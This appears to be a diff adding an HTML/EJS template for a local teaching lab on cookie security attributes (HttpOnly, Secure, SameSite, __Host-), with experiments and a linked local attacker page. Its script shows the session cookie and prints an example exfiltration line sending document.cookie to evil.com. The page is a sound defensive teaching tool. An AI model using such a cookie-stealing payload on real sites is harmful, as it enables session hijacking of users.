@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🍪 Cookie Security Dashboard</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; padding: 20px; }
+    .container { max-width: 900px; margin: 0 auto; }
+
+    /* Header */
+    .header { display: flex; justify-content: space-between; align-items: center; background: white; padding: 16px 24px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
+    .header h1 { font-size: 22px; color: #333; }
+    .header-right { display: flex; gap: 12px; align-items: center; }
+    .header-right span { color: #666; font-size: 14px; }
+    .header-right a { color: #e74c3c; text-decoration: none; font-weight: 600; font-size: 14px; }
+
+    /* Cards */
+    .card { background: white; padding: 20px 24px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); margin-bottom: 16px; }
+    .card h2 { font-size: 17px; color: #333; margin-bottom: 12px; border-bottom: 2px solid #f0f0f0; padding-bottom: 8px; }
+
+    /* Toggle buttons */
+    .toggle-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .toggle-item { display: flex; justify-content: space-between; align-items: center; padding: 14px 18px; border-radius: 10px; border: 2px solid #e8e8e8; }
+    .toggle-item.on { border-color: #27ae60; background: #f0fdf4; }
+    .toggle-item.off { border-color: #e74c3c; background: #fef2f2; }
+    .toggle-label h3 { font-size: 14px; margin-bottom: 2px; }
+    .toggle-label p { font-size: 12px; color: #888; }
+    .toggle-btn { padding: 6px 14px; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; color: white; }
+    .toggle-btn.on { background: #27ae60; }
+    .toggle-btn.off { background: #e74c3c; }
+
+    /* Cookie display */
+    .cookie-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    .cookie-table th { text-align: left; padding: 8px 12px; background: #f8f9fa; border-bottom: 2px solid #e0e0e0; color: #555; }
+    .cookie-table td { padding: 8px 12px; border-bottom: 1px solid #f0f0f0; font-family: monospace; word-break: break-all; }
+    .attr-on { color: #27ae60; font-weight: 600; }
+    .attr-off { color: #e74c3c; font-weight: 600; }
+
+    /* Raw cookie header */
+    .raw-cookie { background: #1e1e1e; color: #d4d4d4; padding: 14px 18px; border-radius: 8px; font-family: 'Consolas', monospace; font-size: 13px; word-break: break-all; line-height: 1.5; overflow-x: auto; }
+    .raw-cookie .label { color: #9cdcfe; }
+    .raw-cookie .value { color: #ce9178; }
+
+    /* Experiment boxes */
+    .experiment { padding: 16px 20px; border-radius: 10px; border-left: 4px solid #4a90d9; background: #f8faff; margin-bottom: 12px; }
+    .experiment h3 { font-size: 14px; color: #2c3e50; margin-bottom: 6px; }
+    .experiment p { font-size: 13px; color: #555; line-height: 1.5; }
+    .experiment code { background: #e8e8e8; padding: 1px 5px; border-radius: 3px; font-size: 12px; }
+    .experiment .result { margin-top: 8px; padding: 8px 12px; border-radius: 6px; font-family: monospace; font-size: 12px; }
+    .experiment .result.danger { background: #fef2f2; color: #dc2626; border: 1px solid #fca5a5; }
+    .experiment .result.safe { background: #f0fdf4; color: #16a34a; border: 1px solid #86efac; }
+
+    /* XSS test area */
+    .xss-area { margin-top: 10px; }
+    .xss-btn { padding: 8px 16px; background: #e74c3c; color: white; border: none; border-radius: 6px; font-size: 13px; cursor: pointer; font-weight: 600; }
+    .xss-btn:hover { background: #c0392b; }
+    .xss-result { margin-top: 8px; padding: 10px 14px; background: #1e1e1e; color: #d4d4d4; border-radius: 6px; font-family: monospace; font-size: 12px; min-height: 40px; white-space: pre-wrap; word-break: break-all; }
+
+    /* Cross-site test area */
+    .crosssite-result { margin-top: 8px; padding: 10px 14px; background: #1e1e1e; color: #d4d4d4; border-radius: 6px; font-family: monospace; font-size: 12px; min-height: 40px; white-space: pre-wrap; }
+
+    /* Attacker link */
+    .attacker-link { display: inline-block; margin-top: 8px; padding: 6px 14px; background: #7c3aed; color: white; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: 600; }
+    .attacker-link:hover { background: #6d28d9; }
+
+    /* Two column layout */
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    @media (max-width: 768px) { .two-col, .toggle-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <h1>🍪 Cookie Security Lab</h1>
+      <div class="header-right">
+        <span>👤 <%= username %></span>
+        <a href="/logout">Logout</a>
+      </div>
+    </div>
+
+    <!-- Current Cookie Settings -->
+    <div class="card">
+      <h2>⚙️ Cookie Attribute Toggles <span style="font-size: 12px; color: #888;">(changes require re-login)</span></h2>
+      <div class="toggle-grid">
+        <!-- HttpOnly -->
+        <div class="toggle-item <%= cookieSettings.httpOnly ? 'on' : 'off' %>">
+          <div class="toggle-label">
+            <h3>HttpOnly</h3>
+            <p>Block JavaScript from reading cookie</p>
+          </div>
+          <form method="POST" action="/toggle">
+            <input type="hidden" name="setting" value="httpOnly">
+            <button class="toggle-btn <%= cookieSettings.httpOnly ? 'on' : 'off' %>">
+              <%= cookieSettings.httpOnly ? 'ON ✅' : 'OFF ❌' %>
+            </button>
+          </form>
+        </div>
+
+        <!-- Secure -->
+        <div class="toggle-item <%= cookieSettings.secure ? 'on' : 'off' %>">
+          <div class="toggle-label">
+            <h3>Secure</h3>
+            <p>Only send over HTTPS</p>
+          </div>
+          <form method="POST" action="/toggle">
+            <input type="hidden" name="setting" value="secure">
+            <button class="toggle-btn <%= cookieSettings.secure ? 'on' : 'off' %>">
+              <%= cookieSettings.secure ? 'ON ✅' : 'OFF ❌' %>
+            </button>
+          </form>
+        </div>
+
+        <!-- SameSite -->
+        <div class="toggle-item <%= cookieSettings.sameSite === 'strict' ? 'on' : (cookieSettings.sameSite === 'lax' ? 'on' : 'off') %>">
+          <div class="toggle-label">
+            <h3>SameSite</h3>
+            <p>Cross-site cookie policy</p>
+          </div>
+          <form method="POST" action="/toggle">
+            <input type="hidden" name="setting" value="sameSite">
+            <button class="toggle-btn <%= cookieSettings.sameSite === 'none' ? 'off' : 'on' %>">
+              <%= cookieSettings.sameSite.toUpperCase() %>
+            </button>
+          </form>
+        </div>
+
+        <!-- __Host- Prefix -->
+        <div class="toggle-item <%= cookieSettings.useHostPrefix ? 'on' : 'off' %>">
+          <div class="toggle-label">
+            <h3>__Host- Prefix</h3>
+            <p>Strictest cookie rules</p>
+          </div>
+          <form method="POST" action="/toggle">
+            <input type="hidden" name="setting" value="hostPrefix">
+            <button class="toggle-btn <%= cookieSettings.useHostPrefix ? 'on' : 'off' %>">
+              <%= cookieSettings.useHostPrefix ? 'ON ✅' : 'OFF ❌' %>
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Cookie Inspector -->
+    <div class="card">
+      <h2>🔍 Cookie Inspector — What the Browser Received</h2>
+
+      <table class="cookie-table">
+        <tr>
+          <th>Attribute</th>
+          <th>Current Value</th>
+          <th>Security Impact</th>
+        </tr>
+        <tr>
+          <td><strong>Cookie Name</strong></td>
+          <td><%= cookieSettings.useHostPrefix ? '__Host-session_id' : 'session_id' %></td>
+          <td><%= cookieSettings.useHostPrefix ? '🔒 __Host- prefix enforces strict rules' : 'Regular name — no prefix protection' %></td>
+        </tr>
+        <tr>
+          <td><strong>HttpOnly</strong></td>
+          <td class="<%= cookieSettings.httpOnly ? 'attr-on' : 'attr-off' %>"><%= cookieSettings.httpOnly ? '✅ true' : '❌ false' %></td>
+          <td><%= cookieSettings.httpOnly ? '🛡️ JavaScript cannot read this cookie' : '⚠️ JavaScript CAN read this cookie via document.cookie' %></td>
+        </tr>
+        <tr>
+          <td><strong>Secure</strong></td>
+          <td class="<%= cookieSettings.secure ? 'attr-on' : 'attr-off' %>"><%= cookieSettings.secure ? '✅ true' : '❌ false' %></td>
+          <td><%= cookieSettings.secure ? '🛡️ Cookie only sent over HTTPS' : '⚠️ Cookie sent over HTTP (plaintext on network!)' %></td>
+        </tr>
+        <tr>
+          <td><strong>SameSite</strong></td>
+          <td class="<%= cookieSettings.sameSite === 'strict' ? 'attr-on' : (cookieSettings.sameSite === 'lax' ? 'attr-on' : 'attr-off') %>">
+            <%= cookieSettings.sameSite %>
+          </td>
+          <td>
+            <% if (cookieSettings.sameSite === 'strict') { %>
+              🛡️ Cookie NEVER sent on cross-site requests
+            <% } else if (cookieSettings.sameSite === 'lax') { %>
+              🟡 Cookie sent on top-level navigations (links), NOT on sub-requests (fetch, img, iframe)
+            <% } else { %>
+              ⚠️ Cookie sent on ALL requests including cross-site
+            <% } %>
+          </td>
+        </tr>
+        <tr>
+          <td><strong>Path</strong></td>
+          <td>/</td>
+          <td>Cookie sent for all paths under /</td>
+        </tr>
+        <tr>
+          <td><strong>MaxAge</strong></td>
+          <td>1 hour</td>
+          <td>Cookie expires after 1 hour</td>
+        </tr>
+      </table>
+
+      <h3 style="margin-top: 16px; font-size: 14px; color: #555;">Raw Cookie Header (sent by browser)</h3>
+      <div class="raw-cookie">
+        <span class="label">Cookie:</span> <span class="value"><%= rawCookieHeader %></span>
+      </div>
+    </div>
+
+    <!-- Experiments -->
+    <div class="two-col">
+      <!-- Experiment 1 & 2: HttpOnly -->
+      <div class="card">
+        <h2>🧪 Experiment 1-2: HttpOnly</h2>
+
+        <div class="experiment">
+          <h3>Can JavaScript read the session cookie?</h3>
+          <p>
+            If <code>HttpOnly</code> is <strong>OFF</strong>, an XSS attack can steal your session cookie
+            using <code>document.cookie</code>. If <strong>ON</strong>, the cookie is invisible to JavaScript.
+          </p>
+
+          <div class="xss-area">
+            <button class="xss-btn" onclick="stealCookie()">
+              🕵️ Run: document.cookie
+            </button>
+            <div class="xss-result" id="xss-result">Click the button to see what JavaScript can read...</div>
+          </div>
+
+          <div class="result <%= cookieSettings.httpOnly ? 'safe' : 'danger' %>" style="margin-top: 10px;">
+            <% if (cookieSettings.httpOnly) { %>
+              ✅ HttpOnly is ON — <code>document.cookie</code> won't show session_id.
+              An XSS attacker can't steal your session!
+            <% } else { %>
+              ⚠️ HttpOnly is OFF — <code>document.cookie</code> WILL show session_id.
+              An XSS attacker can steal your session and impersonate you!
+            <% } %>
+          </div>
+        </div>
+
+        <a href="/xss-demo" style="display:inline-block; margin-top:8px; color:#4a90d9; font-size:13px;">
+          → Try the full XSS cookie theft demo
+        </a>
+      </div>
+
+      <!-- Experiment 3: Secure -->
+      <div class="card">
+        <h2>🧪 Experiment 3: Secure Flag</h2>
+
+        <div class="experiment">
+          <h3>Is the cookie protected in transit?</h3>
+          <p>
+            The <code>Secure</code> flag ensures the cookie is only sent over <strong>HTTPS</strong>.
+            Without it, anyone on the same network (Wi-Fi) can see your cookie in plaintext.
+          </p>
+          <p style="margin-top: 8px;">
+            Since we're on <code>http://localhost</code> (not HTTPS), turning <code>Secure</code> ON
+            may cause the browser to <strong>reject</strong> the cookie entirely!
+          </p>
+
+          <div class="result <%= cookieSettings.secure ? 'safe' : 'danger' %>">
+            <% if (cookieSettings.secure) { %>
+              🛡️ Secure is ON — cookie only sent over HTTPS.
+              (On localhost HTTP, browser may reject this cookie!)
+            <% } else { %>
+              ⚠️ Secure is OFF — cookie sent over HTTP in plaintext.
+              Anyone sniffing the network can steal it!
+            <% } %>
+          </div>
+        </div>
+
+        <div class="experiment" style="border-left-color: #e67e22;">
+          <h3>💡 How attackers exploit this</h3>
+          <p>
+            On public Wi-Fi, a "man-in-the-middle" attacker can see all HTTP traffic.
+            Without <code>Secure</code>, your session cookie flies over the network
+            as plaintext — like writing your password on a postcard.
+          </p>
+        </div>
+      </div>
+
+      <!-- Experiment 4 & 5: SameSite -->
+      <div class="card">
+        <h2>🧪 Experiment 4-5: SameSite</h2>
+
+        <div class="experiment">
+          <h3>Does the cookie get sent on cross-site requests?</h3>
+          <p>
+            Open the <strong>attacker site</strong> at <code>127.0.0.1:4000</code> — it tries to
+            make requests to <code>localhost:3000</code>. Whether the cookie is sent depends on SameSite.<br>
+            <small><strong>⚠️ Must use 127.0.0.1 NOT localhost</strong> — same domain = same site, SameSite won't block!</small>
+          </p>
+
+          <div class="result <%= cookieSettings.sameSite === 'strict' ? 'safe' : (cookieSettings.sameSite === 'lax' ? 'safe' : 'danger') %>">
+            <% if (cookieSettings.sameSite === 'strict') { %>
+              🛡️ SameSite=Strict — Cookie is NEVER sent cross-site.
+              Cross-site fetch, form, link — all blocked.
+            <% } else if (cookieSettings.sameSite === 'lax') { %>
+              🟡 SameSite=Lax — Cookie sent on top-level navigations (clicking a link),
+              but NOT on sub-requests (fetch, iframe, img, form POST).
+            <% } else { %>
+              ⚠️ SameSite=None — Cookie sent on ALL cross-site requests!
+              Attacker site can make authenticated requests.
+            <% } %>
+          </div>
+        </div>
+
+        <a href="http://127.0.0.1:4000" target="_blank" class="attacker-link">
+          😈 Open Attacker Site (127.0.0.1:4000)
+        </a>
+      </div>
+
+      <!-- Experiment 6: __Host- Prefix -->
+      <div class="card">
+        <h2>🧪 Experiment 6: __Host- Prefix</h2>
+
+        <div class="experiment">
+          <h3>The strictest cookie protection</h3>
+          <p>
+            A cookie named <code>__Host-session_id</code> tells the browser to enforce:
+          </p>
+          <ul style="margin: 8px 0 8px 20px; font-size: 13px; color: #555;">
+            <li>Must have <code>Secure</code> flag (HTTPS only)</li>
+            <li>Must have <code>Path=/</code></li>
+            <li>Must NOT have a <code>Domain</code> attribute</li>
+          </ul>
+          <p>
+            If any rule is violated, the browser <strong>rejects</strong> the cookie entirely.
+            This prevents subdomain attacks and cookie overwriting.
+          </p>
+
+          <div class="result <%= cookieSettings.useHostPrefix ? 'safe' : 'danger' %>">
+            <% if (cookieSettings.useHostPrefix) { %>
+              🛡️ __Host- prefix is ON — browser enforces strict rules.
+              (On HTTP localhost, browser may reject — that's the point!)
+            <% } else { %>
+              ℹ️ Using regular cookie name — no prefix protection.
+              A subdomain or MITM could overwrite this cookie.
+            <% } %>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Summary: What each attribute protects against -->
+    <div class="card">
+      <h2>📊 Cookie Security Cheat Sheet</h2>
+      <table class="cookie-table">
+        <tr>
+          <th>Attribute</th>
+          <th>Protects Against</th>
+          <th>How</th>
+        </tr>
+        <tr>
+          <td><strong>HttpOnly</strong></td>
+          <td>XSS cookie theft</td>
+          <td>JavaScript can't read the cookie</td>
+        </tr>
+        <tr>
+          <td><strong>Secure</strong></td>
+          <td>Network sniffing (MITM)</td>
+          <td>Cookie only sent over HTTPS</td>
+        </tr>
+        <tr>
+          <td><strong>SameSite=Strict</strong></td>
+          <td>CSRF attacks</td>
+          <td>Cookie never sent cross-site</td>
+        </tr>
+        <tr>
+          <td><strong>SameSite=Lax</strong></td>
+          <td>CSRF (partial)</td>
+          <td>Sent on navigations, blocked on sub-requests</td>
+        </tr>
+        <tr>
+          <td><strong>__Host- prefix</strong></td>
+          <td>Cookie overwriting, subdomain attacks</td>
+          <td>Forces Secure + Path=/ + no Domain</td>
+        </tr>
+        <tr>
+          <td><strong>__Secure- prefix</strong></td>
+          <td>Network sniffing</td>
+          <td>Forces Secure flag</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <script>
+    // ============================================
+    // XSS Cookie Theft Demo
+    // ============================================
+    function stealCookie() {
+      const resultEl = document.getElementById('xss-result');
+      const cookies = document.cookie;
+
+      if (!cookies || cookies.trim() === '') {
+        resultEl.textContent = '🔒 document.cookie returned EMPTY!\n\nNo cookies visible to JavaScript.\nIf HttpOnly is ON, session_id is hidden.\nIf no cookies at all, you may need to re-login.';
+        resultEl.style.borderLeft = '3px solid #27ae60';
+      } else {
+        // Parse and display cookies
+        const parts = cookies.split(';').map(c => c.trim());
+        let output = '⚠️ document.cookie returned:\n\n';
+        let foundSession = false;
+
+        parts.forEach(cookie => {
+          const [name, ...rest] = cookie.split('=');
+          const value = rest.join('=');
+          output += `  ${name.trim()} = ${value}\n`;
+          if (name.trim() === 'session_id' || name.trim() === '__Host-session_id') {
+            foundSession = true;
+          }
+        });
+
+        if (foundSession) {
+          output += '\n💀 SESSION COOKIE STOLEN!\n';
+          output += 'An attacker with XSS could send this to their server:\n';
+          output += `fetch("http://evil.com/steal?cookie=" + document.cookie)`;
+          resultEl.style.borderLeft = '3px solid #e74c3c';
+        } else {
+          output += '\n🛡️ Session cookie NOT visible (HttpOnly is protecting it)\n';
+          output += 'Only non-HttpOnly cookies like user_prefs are readable.';
+          resultEl.style.borderLeft = '3px solid #27ae60';
+        }
+
+        resultEl.textContent = output;
+      }
+    }
+  </script>
+</body>
+</html>
